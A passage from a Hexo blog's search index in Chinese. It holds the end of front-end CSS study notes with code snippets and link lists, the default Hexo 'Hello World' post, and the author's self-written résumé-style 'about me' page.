义链接的普通状态，此时显示的是底部的部分，向下取负值*/</span>&#125;</code></pre></div></li></ul></li><li><p>更多的<code>CSS</code>雪碧，图片更复杂，背景定位更精确。可能会用到大量的数值</p><ul><li>如：<code>background:url(nav.png) -180px 24pxno-repeat</code>; 来达到更精确的定位</li></ul></li><li><p><strong>优点：</strong></p><ul><li>减少加载网页图片时对服务器的请求次数</li><li>可以合并多数背景图片和小图标，方便在任何位置使用，这样不同位置的请求只需要调用一个图片，从而减少对服务器的请求次数，降低服务器压力，同时提高了页面的加载速度，节约服务器的流量。</li><li>提高页面的加载速度</li><li><code>sprite </code>技术的其中一个好处是图片的加载时间(在有许多 <code>sprite</code> 时，单张图片的加载时间)。由所需图片拼成的一张 <code>GIF</code>图片的尺寸会明显小于所有图片拼合前的大小。单张的 <code>GIF</code>只有相关的一个色表，而单独分割的每一张 <code>GIF</code> 都有自己的一个色表，这就增加了总体的大小。因此，单独的一张 <code>JPEG</code> 或者 <code>PNG</code> <code>sprite</code> 在大小上非常可能比把一张图分成多张得来的图片总尺寸小。</li><li>减少鼠标滑过的一些<code>bug</code></li><li><code>IE6</code>不会主动预加载鼠标滑过即<code>a:hover</code>中的背景图片，所以，如果使用多张图片，鼠标滑过会出现闪白的现象。使用<code>CSS</code>雪碧，由于一张图片即可，所以不会出现这种现象。</li></ul></li><li><p><strong>不足：</strong></p><ul><li><code>CSS</code>雪碧的最大问题是内存使用</li><li>影响浏览器的缩放功能</li><li>拼图维护比较麻烦</li><li>使<code>CSS</code>的编写变得困难</li><li><code>CSS</code> 雪碧调用的图片不能被打印</li><li>错误得使用 <code>Sprites</code> 影响可访问性</li></ul></li></ul><h4 id="附录四-一些tips解决方案"><a href="#附录四-一些tips解决方案" class="headerlink" title="附录四 一些tips解决方案"></a>附录四 一些tips解决方案</h4><hr><h5 id="页面优化实践"><a href="#页面优化实践" class="headerlink" title="页面优化实践"></a>页面优化实践</h5><hr><ul><li><p>从下面的几个方面可以进行页面的优化：</p><ul><li>减少请求数</li><li>图片合并</li><li><code>CSS </code>文件合并</li><li>减少内联样式</li><li>避免在 <code>CSS </code>中使用 <code>import</code></li><li>减少文件大小</li><li>选择适合的图片格式</li><li>图片压缩</li><li><code>CSS</code> 值缩写（<code>Shorthand Property</code>)</li><li>文件压缩</li><li>页面性能</li><li>调整文件加载顺序</li><li>减少标签数量</li><li>调整选择器长度</li><li>尽量使用<code> CSS</code> 制作显示表现</li><li>增强代码可读性与可维护性</li><li>规范化</li><li>语义化</li><li>模块化</li></ul></li></ul><h5 id="写DIV-CSS-的一些常识"><a href="#写DIV-CSS-的一些常识" class="headerlink" title="写DIV+CSS 的一些常识"></a>写DIV+CSS 的一些常识</h5><hr><ul><li><p>不要使用过小的图片做背景平铺</p><ul><li>这就是为何很多人都不用 <code>1px</code> 的原因，这才知晓。宽高 <code>1px</code> 的图片平铺出一个宽高 <code>200px</code> 的区域，需要 <code>200200=40, 000</code> 次，占用资源</li></ul></li><li><p>无边框</p><ul><li>推荐的写法是 <code>border:none</code>;，哈哈，我一直在用这个。 <code>border:0;</code> 只是定义边框宽度为零，但边框样式、颜色还是会被浏览器解析，占用资源</li></ul></li><li><p>慎用 通配符</p><ul><li>所谓通配符，就是将<code> CSS</code> 中的所有标签均初始化，不管用的不用的，过时的先进的，一视同仁，这样，大大的占用资源。要有选择的初始化标签。</li></ul></li><li><p><code>CSS </code>的十六进制颜色代码缩写</p><ul><li>习惯了缩写及小写，这才知道，原来不是推荐的写法，为的是减少解析所占用的资源。但同时会增加文件体积。孰优孰劣，有待仔细考证。</li></ul></li><li><p> 样式放头上，脚本放脚下。不内嵌，只外链</p></li><li><p> 坚决不用 <code>CSS </code>表达式</p></li><li><p>使用 引用样式表，而不是通过<code> @import</code> 导入。</p></li><li><p> 一般来说，<code>PNG </code>比 <code>GIF</code> 要小，小得多。再者，<code>GIF</code> 中有多少颜色是被浪费的，很值得优化。</p></li><li><p>千万不要在 <code>HTML </code>中缩放图片，一者不好看，二者占资源。</p></li><li><p>正文字体最好用偶数</p><ul><li><code>12px</code>、<code>14px</code>、<code>16px</code>，效果非常好。特例，<code>15px</code>。</li></ul></li><li><p><code>block</code>、<code>ul</code>、<code>ol </code>等上下留出至少一倍行距，左侧至少两倍行距，右侧随意。</p></li><li><p>段落之间，至少要有一倍行距</p></li><li><p>强行指定某些元素的 <code>line-height</code>，正文 <code>1.6 </code>倍于文字大小，标题<code>1.3 </code>倍。</p></li><li><p>中文标点用全角</p><ul><li>英文夹杂在中文中，左右空格，半角。</li></ul></li><li><p>中文字体的粗体和斜体，远离较好</p></li></ul><h5 id="常用代码片段"><a href="#常用代码片段" class="headerlink" title="常用代码片段"></a>常用代码片段</h5><hr><ul><li>雅虎工程师提供的<code>CSS</code>初始化示例代码【仅供参考】<ul><li>可以在<code>html</code>头文件中直接引用，从而避免浏览器的不兼容带来的错误。</li></ul></li></ul><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>,<span class="hljs-selector-tag">div</span>,<span class="hljs-selector-tag">dl</span>,<span class="hljs-selector-tag">dt</span>,<span class="hljs-selector-tag">dd</span>,<span class="hljs-selector-tag">ul</span>,<span class="hljs-selector-tag">ol</span>,<span class="hljs-selector-tag">li</span>,<span class="hljs-selector-tag">h1</span>,<span class="hljs-selector-tag">h2</span>,<span class="hljs-selector-tag">h3</span>,<span class="hljs-selector-tag">h4</span>,<span class="hljs-selector-tag">h5</span>,<span class="hljs-selector-tag">h6</span>,<span class="hljs-selector-tag">pre</span>,<span class="hljs-selector-tag">code</span>,<span class="hljs-selector-tag">form</span>,<span class="hljs-selector-tag">fieldset</span>,<span class="hljs-selector-tag">legend</span>,<span class="hljs-selector-tag">input</span>,<span class="hljs-selector-tag">button</span>,<span class="hljs-selector-tag">textarea</span>,<span class="hljs-selector-tag">p</span>,<span class="hljs-selector-tag">blockquote</span>,<span class="hljs-selector-tag">th</span>,<span class="hljs-selector-tag">td</span> &#123;     <span class="hljs-attribute">margin</span>:<span class="hljs-number">0</span>; <span class="hljs-attribute">padding</span>:<span class="hljs-number">0</span>; &#125;<span class="hljs-selector-tag">body</span> &#123;    <span class="hljs-attribute">background</span>:<span class="hljs-number">#fff</span>;     <span class="hljs-attribute">color</span>:<span class="hljs-number">#555</span>;     <span class="hljs-attribute">font-size</span>:<span class="hljs-number">14px</span>;     <span class="hljs-attribute">font-family</span>: Verdana, Arial, Helvetica, sans-serif; &#125;<span class="hljs-selector-tag">td</span>,<span class="hljs-selector-tag">th</span>,<span class="hljs-selector-tag">caption</span> &#123;     <span class="hljs-attribute">font-size</span>:<span class="hljs-number">14px</span>;&#125;<span class="hljs-selector-tag">h1</span>, <span class="hljs-selector-tag">h2</span>, <span class="hljs-selector-tag">h3</span>, <span class="hljs-selector-tag">h4</span>, <span class="hljs-selector-tag">h5</span>, <span class="hljs-selector-tag">h6</span> &#123;     <span class="hljs-attribute">font-weight</span>:normal;     <span class="hljs-attribute">font-size</span>:<span class="hljs-number">100%</span>; &#125;<span class="hljs-selector-tag">address</span>, <span class="hljs-selector-tag">caption</span>,<span class="hljs-selector-tag">cite</span>, <span class="hljs-selector-tag">code</span>, <span class="hljs-selector-tag">dfn</span>, <span class="hljs-selector-tag">em</span>, <span class="hljs-selector-tag">strong</span>,<span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">var</span> &#123;     <span class="hljs-attribute">font-style</span>:normal;     <span class="hljs-attribute">font-weight</span>:normal;&#125;<span class="hljs-selector-tag">a</span> &#123;     <span class="hljs-attribute">color</span>:<span class="hljs-number">#555</span>;     <span class="hljs-attribute">text-decoration</span>:none; &#125;<span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;     <span class="hljs-attribute">text-decoration</span>:underline; &#125;<span class="hljs-selector-tag">img</span> &#123;    <span class="hljs-attribute">border</span>:none;&#125;<span class="hljs-selector-tag">ol</span>,<span class="hljs-selector-tag">ul</span>,<span class="hljs-selector-tag">li</span> &#123;     <span class="hljs-attribute">list-style</span>:none; &#125;<span class="hljs-selector-tag">input</span>, <span class="hljs-selector-tag">textarea</span>, <span class="hljs-selector-tag">select</span>, <span class="hljs-selector-tag">button</span> &#123;     <span class="hljs-attribute">font</span>:<span class="hljs-number">14px</span> Verdana,Helvetica,Arial,sans-serif; &#125;<span class="hljs-selector-tag">table</span> &#123;     <span class="hljs-attribute">border-collapse</span>:collapse; &#125;<span class="hljs-selector-tag">html</span> &#123;    <span class="hljs-attribute">overflow-y</span>: scroll;&#125; <span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">:after</span> &#123;    <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;.&quot;</span>;     <span class="hljs-attribute">display</span>: block;     <span class="hljs-attribute">height</span>:<span class="hljs-number">0</span>;     <span class="hljs-attribute">clear</span>:both;     <span class="hljs-attribute">visibility</span>: hidden;&#125;<span class="hljs-selector-class">.clearfix</span> &#123;     *zoom:1; &#125;</code></pre></div><ul><li><code>mobile meta </code>标签</li></ul><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”viewport”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”width</span>=<span class="hljs-string">320,target-densitydpi</span>=<span class="hljs-string">dpi_value,initial-scale</span>=<span class="hljs-string">1,</span> <span class="hljs-attr">user-scalable</span>=<span class="hljs-string">no”/</span>&gt;</span></code></pre></div><ul><li>表格不被撑开</li></ul><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">table-layout</span>: <span class="hljs-selector-tag">fixed</span>;<span class="hljs-selector-tag">word-break</span>: <span class="hljs-selector-tag">break-all</span>;<span class="hljs-selector-tag">border-collapse</span>: <span class="hljs-selector-tag">collapse</span>;</code></pre></div><ul><li>不设宽高居中</li></ul><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">”abc”</span> <span class="hljs-attr">style</span>=<span class="hljs-string">”display:table;text-align:center;width:100%;height:100%;”</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">”background:#f00;</span> <span class="hljs-attr">display:table-cell</span>; <span class="hljs-attr">vertical-align:middle</span>;”&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">”button”</span> <span class="hljs-attr">value</span>=<span class="hljs-string">”item1″</span> /&gt;</span>      <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre></div><ul><li>透明度的兼容代码</li></ul><div class="hljs code-wrapper"><pre><code class="hljs css">filter:alpha(opacity=50); /*1-100*/<span class="hljs-selector-tag">-moz-opacity</span><span class="hljs-selector-pseudo">:0.5</span>; <span class="hljs-comment">/*0-1.0*/</span><span class="hljs-selector-tag">-khtml-opacity</span><span class="hljs-selector-pseudo">:0.5</span>; <span class="hljs-comment">/*0-1.0*/</span><span class="hljs-selector-tag">opacity</span><span class="hljs-selector-pseudo">:0.5</span>; <span class="hljs-comment">/*0-1.0*/</span></code></pre></div><ul><li>文字溢出点点省略</li></ul><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">white-space</span><span class="hljs-selector-pseudo">:nowrap</span>;<span class="hljs-selector-tag">text-overflow</span><span class="hljs-selector-pseudo">:ellipsis</span>;<span class="hljs-selector-tag">overflow</span><span class="hljs-selector-pseudo">:hidden</span>;</code></pre></div><ul><li><p>清除浮动的几种方法</p><ul><li><p>方法一：<code>投机取巧法</code> – 不推荐</p><ul><li>直接一个放到当作最后一个子标签放到父标签那儿，此方法屡试不爽，兼容性强</li></ul></li><li><p>方法二：<code>overflow + zoom</code>方法  –不推荐<br> <code>.fix&#123;overflow:hidden; zoom:1;&#125;</code></p><ul><li>此方法优点在于代码简洁，涵盖所有浏览器</li></ul></li><li><p>方法三：<code>after + zoom</code>方法 -推荐–此方法可以说是综合起来最好的方法了</p><ul><li><code>clearfix</code>只应用在包含浮动子元素的父级元素上</li></ul></li></ul></li></ul><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.fix</span>&#123;<span class="hljs-attribute">zoom</span>:<span class="hljs-number">1</span>;&#125;<span class="hljs-selector-class">.fix</span><span class="hljs-selector-pseudo">:after</span>&#123;     <span class="hljs-attribute">display</span>:block;      <span class="hljs-attribute">content</span>:<span class="hljs-string">&#x27;clear&#x27;</span>;      <span class="hljs-attribute">clear</span>:both;     <span class="hljs-attribute">line-height</span>:<span class="hljs-number">0</span>;      <span class="hljs-attribute">visibility</span>:hidden;&#125;</code></pre></div><ul><li>更多代码片段详情<ul><li><a href="http://www.jianshu.com/p/e878122a92a3">实用的60个CSS代码片段</a></li></ul></li></ul><h5 id="一些总结"><a href="#一些总结" class="headerlink" title="一些总结"></a>一些总结</h5><hr><ul><li><p>自动继承属性：</p><ul><li><code>color</code></li><li><code>font</code></li><li><code>text-align</code></li><li><code>list-style</code><br>…</li></ul></li><li><p>非继承属性：</p><ul><li><code>background</code></li><li><code>border</code></li><li><code>position</code><br>…</li></ul></li><li><p>具有破坏性的元素：</p><ul><li><code>float</code></li><li><code>display:none;</code></li><li><code>position:absoblute/fixed/sticky;</code></li></ul></li><li><p>具有包裹性的元素：</p><ul><li><p><code>display:inline-block/table-cell</code></p></li><li><p><code>position:absolute/fixed/sticky</code></p></li><li><p><code>overflow:hidden/scroll</code></p></li></ul></li><li><p>消除图片底部间隙的方法</p><ul><li><p>图片块状化-无基线对齐<br><code>img&#123;display:block;&#125;</code></p></li><li><p>图片底线对齐<br><code>img&#123;vertical-align:bottom;&#125;</code></p></li><li><p>行高足够小 - 基线位置上移<br><code>.box&#123;line-height:0;&#125;</code></p></li></ul></li></ul><h5 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h5><hr><ul><li><p>BFC</p><ul><li>BFC全称<code>”Block Formatting Context”</code> 中文为“块级格式化上下文”</li></ul><ul><li><p>记住这么一句话：<code>BFC</code>元素特性表现原则就是，内部子元素再怎么翻江倒海，翻云覆雨都不会影响外部的元素</p></li><li><p><code>BFC</code>就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此</p></li><li><p>扩展阅读</p><ul><li><a href="https://github.com/dwqs/blog/issues/22">CSS中的BFC</a></li></ul></li></ul></li><li><p>优雅降级(<code>graceful degradation</code>)</p><ul><li>一开始就构建完整的功能，然后再针对低版本浏览器进行兼容</li></ul></li><li><p>渐进增强 <code>progressive enhancement</code>：</p><ul><li>是在浏览器开启<code>JavaScript</code>功能后，如果浏览器版本不支持某些  <code>JavaScript</code>  能力，我们解决这种问题的方式</li></ul></li><li><p>平稳退化</p><ul><li>是在浏览器没有<code>JavaScript</code>功能，或没有开启<code>JavaScript</code>功能情况下，我们解决这种问题的方式；</li></ul></li></ul><h5 id="方案荟萃扩展阅读"><a href="#方案荟萃扩展阅读" class="headerlink" title="方案荟萃扩展阅读"></a>方案荟萃扩展阅读</h5><hr><ul><li><p><strong>关于布局</strong></p><ul><li><a href="http://www.qianduan.net/css-to-achieve-the-vertical-center-of-the-five-kinds-of-methods/">垂直居中</a></li><li><a href="http://codepen.io/shshaw/full/gEiDt">css完全居中</a></li><li><a href="http://www.w3cplus.com/collective-5.html">居中之美</a></li><li><a href="http://www.zhihu.com/question/35290742#answer-20340542">网页中的底部foot定位</a></li><li><a href="http://www.webhek.com/css-100-percent-height">页面高度100%</a></li><li><a href="https://github.com/phoetry/textareaAutoHeight">textarea高度自适应</a></li><li><a href="http://dotdotdot.frebsite.nl/">多行溢出省略</a></li><li><a href="http://jinlong.github.io/2015/05/24/css-retina-hairlines/">Retina屏1px线</a></li><li><a href="https://github.com/philipwalton/flexbugs">Flexbugs</a></li></ul></li><li><p><strong>其他</strong></p><ul><li><a href="http://www.stepday.com/topic/?690">IF IE ENDIF条件判断之IE10</a></li><li><a href="http://www.zhihu.com/question/20158063">Chrome 翻译插件</a></li><li><a href="http://blog.netsh.org/posts/website-retina_1779.netsh.html">网页retina优化</a></li><li><a href="http://segmentfault.com/a/1190000002407912">常用meta</a></li><li><a href="http://www.cnblogs.com/mq0036/p/3531848.html">树状菜单</a></li><li><a href="http://www.w3ctrain.com/2015/07/24/comprehensive-guide-when-to-use-em-vs-rem/">em vs rem</a></li><li><a href="https://github.com/classicemi/blog/issues/3#issuecomment-113861251">css vs js</a></li><li><a href="http://www.w3cplus.com/solution/index/index.html">css解决方案（w3cplus）</a></li><li><a href="http://riccardoscalco.github.io/textures/">Textures生成纹理</a></li><li><a href="http://una.im/CSSgram/">CSSgram</a></li><li><a href="http://zmoazeni.github.io/csscss/">Csscss（检查重复声明等）</a></li></ul></li></ul><h4 id="附录五-部分工具资源"><a href="#附录五-部分工具资源" class="headerlink" title="附录五 部分工具资源"></a>附录五 部分工具资源</h4><hr><ul><li><a href="http://blog.poetries.top/2016/03/14/Emmet%EF%BC%9AHTML-CSS%E4%BB%A3%E7%A0%81%E5%BF%AB%E9%80%9F%E7%BC%96%E5%86%99%E7%A5%9E%E5%99%A8/">学会使用Emmet插件快速编码</a></li><li><a href="http://blog.poetries.top/2016/09/09/Emmet%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/#more">Emmet常用快捷键</a></li><li><a href="https://github.com/poetries/mywiki/blob/master/bookmark/sublime-text.md">Sublime专题</a></li><li><a href="https://github.com/poetries/mywiki/blob/master/bookmark/Sublime%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E6%80%BB%E7%BB%93.md">Sublime常用插件总结</a></li><li><a href="https://github.com/poetries/mywiki/blob/master/bookmark/Front-End%20-Develop%20-Tools.md">Front-End -Develop -Tools</a></li><li><a href="https://github.com/poetries/mywiki/blob/master/bookmark/Tools.md">ToolsBox-自己整理的一份工具列表</a></li></ul><h4 id="附录六-编码规范"><a href="#附录六-编码规范" class="headerlink" title="附录六 编码规范"></a>附录六 编码规范</h4><hr><ul><li><a href="https://github.com/poetries/mywiki/blob/master/bookmark/%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83.md">编码规范</a></li><li><a href="http://front-end-standards.com/">前端规范</a></li><li><a href="https://github.com/poetries/mywiki/wiki/web-develop-standard">web develop standard</a></li><li><a href="http://codecloud.net/5622.html">Web 前端开发规范文档</a></li><li><a href="http://zhibimo.com/read/Ashu/front-end-style-guide/index.html">前端开发规范手册</a></li></ul><h4 id="附录七-进阶学习"><a href="#附录七-进阶学习" class="headerlink" title="附录七 进阶学习"></a>附录七 进阶学习</h4><hr><ul><li><a href="http://www.jianshu.com/p/1e638b7da640">DOM编程之API学习</a></li><li><a href="http://www.jianshu.com/p/1f2314552e23">JavaScript基础学习</a></li></ul><h4 id="附录八-其他资源"><a href="#附录八-其他资源" class="headerlink" title="附录八 其他资源"></a>附录八 其他资源</h4><hr><ul><li><a href="https://github.com/poetries/mywiki">Github上前端学习资源汇总</a></li><li><a href="https://github.com/poetries/mywiki/tree/master/front-end">WEB 前端开发学习笔记</a></li><li><a href="https://github.com/poetries/mywiki/wiki/%E6%94%B6%E9%9B%86%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7">前端开发工具箱</a></li><li><a href="https://segmentfault.com/a/1190000006689923">148个资源让你成为CSS专家</a></li><li><a href="http://zh.learnlayout.com/">学习CSS布局-经典必看</a></li></ul><h4 id="附录九-常见问题"><a href="#附录九-常见问题" class="headerlink" title="附录九 常见问题"></a>附录九 常见问题</h4><hr><ul><li><p>前端指路</p><ul><li><a href="http://www.w3cplus.com/css/write-to-front-end-developer-interview.html">写给前端面试者（w3cplus）</a></li><li><a href="http://jiongks.name/blog/how-to-become-a-great-front-end-engineer/">如何成为一名卓越的前端工程师（勾三股四博客）</a></li><li><a href="http://www.epubit.com.cn/article/144">什么是全栈工程师</a></li><li><a href="https://uptodate.frontendrescue.org/zh/">如何跟上前端开发的最新前沿</a></li><li><a href="http://blog.jobbole.com/12749/">浏览器的工作原理</a></li><li><a href="http://www.zhihu.com/question/20269059#answer-19718763">移动前端开发和 Web 前端开发的区别</a></li><li><a href="http://segmentfault.com/q/1010000003723038?utm_source=weekly&utm_medium=email&utm_campaign=email_weekly">大型网站CSS编写与维护</a></li><li><a href="http://segmentfault.com/q/1010000003059724">CSS核心技术关键字</a></li></ul></li><li><p>性能/规范/实践</p><ul><li><a href="http://www.chinaw3c.org/how-to-read-spec-wxx.html">如何阅读W3c规范(王晓轩)</a></li><li><a href="http://www.chinaw3c.org/how-to-read-spec-gb.html">如何阅读W3c规范(高博)</a></li><li><a href="https://developer.yahoo.com/performance/rules.html">雅虎web性能优化军规</a></li><li><a href="http://browserdiet.com/zh/">权威前端性能指南</a></li><li><a href="http://www.html-js.com/article/Front-end-home-best-practice-in-front-of-the-web-high-performance-CSS">高性能css</a></li></ul></li><li><p>一些问答社区</p><ul><li><a href="https://www.quora.com/">quora</a></li><li><a href="http://stackoverflow.com/">stackoverflow</a></li><li><a href="http://www.zhihu.com/">知乎</a></li><li><a href="http://www.html-js.com/qa">前端乱炖问答区</a></li><li><a href="http://segmentfault.com/questions/newest">segmentfault问答区</a></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>其他</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World🎁</title>
    <link href="/hexo_blog/2019/02/10/hello-world/"/>
    <url>/hexo_blog/2019/02/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre></div><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">$ hexo server</code></pre></div><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">$ hexo generate</code></pre></div><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">$ hexo deploy</code></pre></div><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>其他</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title></title>
    <link href="/hexo_blog/"/>
    <url>/hexo_blog/</url>
    
    <content type="html"><![CDATA[<h1 id="我的博客🎋"><a href="#我的博客🎋" class="headerlink" title="我的博客🎋"></a>我的博客🎋</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>分享一些学习工作中的见解或者笔记,希望在每次的分享中能发现巩固所学，领悟更多</p><p><img src="C:/Users/l%27x/Pictures/%E4%B8%8B%E8%BD%BD.jpeg"></p><h3 id="个人信息🎏"><a href="#个人信息🎏" class="headerlink" title="个人信息🎏"></a>个人信息🎏</h3><blockquote><ul><li>周航/女</li><li>本科/重庆理工大学/计算机系</li><li>工作年限/应届生/本科</li><li>技术博客：<a href="https://link.segmentfault.com/?url=https://wscats.github.io/blog">https://wscats.github.io/blog</a> </li><li>Github：<a href="https://github.com/zhouhanging">https://github.com/zhouhanging</a></li><li>邮箱：<a href="mailto:&#51;&#x34;&#57;&#x33;&#x33;&#50;&#x39;&#x37;&#53;&#x36;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#51;&#x34;&#57;&#x33;&#x33;&#50;&#x39;&#x37;&#53;&#x36;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a></li><li>实习经历：恒生电子股份有限公司</li><li>期望职位：前端工程师</li><li>期望城市：杭州</li></ul></blockquote><h3 id="技能清单"><a href="#技能清单" class="headerlink" title="技能清单"></a>技能清单</h3><blockquote><p>l 扎实的前端基础，良好的编码能力以及编码习惯</p><p>l 掌握HTML、CSS、JavaScript、ES6</p><p>l 熟悉 Vue 技术栈如 Vue-Router、Vuex及相关流行库的使用 </p><p>l 掌握常见的数据结构和算法</p><p>l 掌握 TCP、HTTP 网络协议，了解一些浏览器的渲染原理、性能优化</p></blockquote><h3 id="自我评价"><a href="#自我评价" class="headerlink" title="自我评价"></a>自我评价</h3><blockquote><ol><li><p>对前端技术具有浓厚的兴趣，喜欢逛github，掘金等技术论坛；</p></li><li><p>具备良好的审美能力，有良好的代码编程习惯；</p></li><li><p>学习适应能力强，愿意不断学习新知识丰富自己；</p></li><li><p>抗压能力强，有信心在不同的工作强度下进行开发工作；</p></li><li><p>性格随和，具有良好的团队合作精神。</p></li><li><p>我热爱这个行业，对新鲜事物充满好奇心，关注前沿技术，善于学习和独立分析解决疑难，善于沟通，团队协作，贴近用户。酷爱创意，追求设计感，个人性格开朗乐观，有着较强的学习能力。</p></li></ol></blockquote>]]></content>
    
  </entry>
  
  
  
</search>
